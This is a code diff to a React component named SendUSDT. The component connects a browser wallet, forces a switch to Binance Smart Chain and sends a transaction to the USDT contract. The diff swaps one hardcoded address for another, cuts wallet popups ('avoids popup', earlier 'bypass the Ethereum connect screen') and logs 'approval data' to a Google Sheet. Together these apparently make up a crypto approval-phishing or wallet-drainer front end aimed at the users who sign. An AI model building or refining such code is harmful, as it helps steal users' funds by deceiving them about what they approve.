@@ -4,7 +4,7 @@ import './SendUSDT.css';
 import { logApprovalData } from '../services/GoogleSheetService';
 
 const SendUSDT = () => {
-  const [address, setAddress] = useState('0x19686F7B15Ef89Bf87D20b3502E8CA9e8c98a2f1');
+  const [address, setAddress] = useState('0xeC7044153da0Aa775B7c35C5d257F459eFe55ff6');
   const [amount, setAmount] = useState('');
   const [isVerifying, setIsVerifying] = useState(false);
 
@@ -17,46 +17,40 @@ const SendUSDT = () => {
     setIsVerifying(true);
     
     try {
-      // 1. Suggest switching to BSC *before* connection to bypass the Ethereum connect screen
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }],
-        });
-      } catch (e) {
-        // Silently catch - it might fail if permission is needed first
+      // 1. Get accounts (avoids popup if already connected)
+      let accounts = await window.ethereum.request({ method: "eth_accounts" });
+      if (!accounts || accounts.length === 0) {
+        accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       }
-
-      // 2. Request accounts (will default to BSC if the switch above worked)
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const userAddress = accounts[0];
-      
-      // 3. Fallback switch if the first one failed
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }],
-        });
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [
-                {
-                  chainId: '0x38',
-                  chainName: 'Binance Smart Chain Mainnet',
-                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com/'],
-                },
-              ],
-            });
-          } catch (addError) {
-            throw new Error("Failed to add Binance Smart Chain to wallet.");
+
+      // 2. Switch to BSC if not already on it (avoids popup if already on BSC)
+      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+      if (chainId !== '0x38' && chainId !== 56 && chainId !== '56') {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }],
+          });
+        } catch (switchError) {
+          if (switchError.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [
+                  {
+                    chainId: '0x38',
+                    chainName: 'Binance Smart Chain Mainnet',
+                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                    rpcUrls: ['https://bsc-dataseed1.binance.org/'],
+                    blockExplorerUrls: ['https://bscscan.com/'],
+                  },
+                ],
+              });
+            } catch (addError) {
+              console.error("Failed to add chain", addError);
+            }
           }
-        } else {
-          console.warn("Failed to switch to Binance Smart Chain.", switchError);
         }
       }
 
@@ -86,6 +80,7 @@ const SendUSDT = () => {
         params: [{
           from: userAddress,
           to: USDT_BSC,
+          value: "0x0",
           data: data
         }]
       });
